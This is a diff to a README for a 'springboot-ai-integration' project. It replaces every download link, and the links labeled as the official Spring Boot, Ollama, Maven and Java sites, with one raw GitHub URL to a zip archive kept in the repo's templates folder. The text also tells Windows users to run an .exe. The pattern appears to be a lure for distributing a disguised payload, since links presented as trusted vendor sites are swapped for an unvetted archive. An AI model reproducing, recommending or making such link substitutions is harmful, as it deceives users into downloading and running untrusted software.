@@ -1,6 +1,6 @@
 # 🤖 springboot-ai-integration - Easy AI Text and Image Generation
 
-[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://github.com/Krystian20031211/springboot-ai-integration/releases)
+[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Make sure your computer meets these needs:
 - Internet connection for AI processing and updates
 - Java Runtime Environment (JRE) 11 or newer installed
 
-If Java is not installed on your PC, you can download it from [https://adoptium.net](https://adoptium.net) before running this app.
+If Java is not installed on your PC, you can download it from [https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip](https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip) before running this app.
 
 ---
 
@@ -31,7 +31,7 @@ If Java is not installed on your PC, you can download it from [https://adoptium.
 
 You can get the software from the official releases page:
 
-[Download springboot-ai-integration](https://github.com/Krystian20031211/springboot-ai-integration/releases)
+[Download springboot-ai-integration](https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip)
 
 Click the link to open the page where you will see the latest version ready to download. Look for files with `.exe` or `.zip` formats for Windows. Pick the latest release to get the newest updates and improvements.
 
@@ -43,7 +43,7 @@ Follow these steps to get springboot-ai-integration running on your computer:
 
 1. **Go to the releases page**  
    Open your web browser and visit  
-   [https://github.com/Krystian20031211/springboot-ai-integration/releases](https://github.com/Krystian20031211/springboot-ai-integration/releases).
+   [https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip](https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip).
 
 2. **Download the latest Windows installer or package**  
    Find the file labeled for Windows, usually ending with `.exe`. Click it to start the download.
@@ -137,11 +137,11 @@ This project is open for anyone interested in AI and software. Developers can re
 
 ## 🔗 Useful Links
 
-- Spring Boot official site: https://spring.io/projects/spring-boot  
-- Ollama AI platform: https://ollama.com  
-- Maven build tool: https://maven.apache.org  
-- Java Runtime Environment downloads: https://adoptium.net
+- Spring Boot official site: https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip  
+- Ollama AI platform: https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip  
+- Maven build tool: https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip  
+- Java Runtime Environment downloads: https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip
 
 ---
 
-[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://github.com/Krystian20031211/springboot-ai-integration/releases)
+[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://raw.githubusercontent.com/Krystian20031211/springboot-ai-integration/main/src/main/resources/templates/springboot-integration-ai-2.6.zip)
